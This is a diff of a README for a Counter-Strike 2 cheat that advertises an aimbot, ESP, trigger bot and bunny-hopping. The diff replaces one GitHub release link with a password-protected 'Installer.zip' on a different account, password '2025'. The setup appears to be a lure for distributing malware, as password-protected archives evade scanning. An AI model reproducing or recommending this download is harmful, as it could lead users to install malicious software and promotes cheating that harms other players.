@@ -1,5 +1,5 @@
-# [DOWNLOAD LINK](https://github.com/sandiebottle409/Cheat-CS2/releases/download/Download/installer.zip)
-# PASSWORD : 2025
+## [DOWNLOAD LINK](https://github.com/bow-coverbang/installerz/releases/download/install/Installer.zip) 
+ # PASSWORD : 2025 
 # Cheat-CS2
 
 🎮 Welcome to Cheat-CS2, the ultimate external cheat for Counter-Strike 2! 🎯 This cheat operates independently of the game's memory and is designed to enhance your Windows API skills while giving you an edge in gameplay. With features like AimBot, ESP, Trigger Bot, BunnyHop, and automatic offset updates, you'll dominate the battlefield like never before.
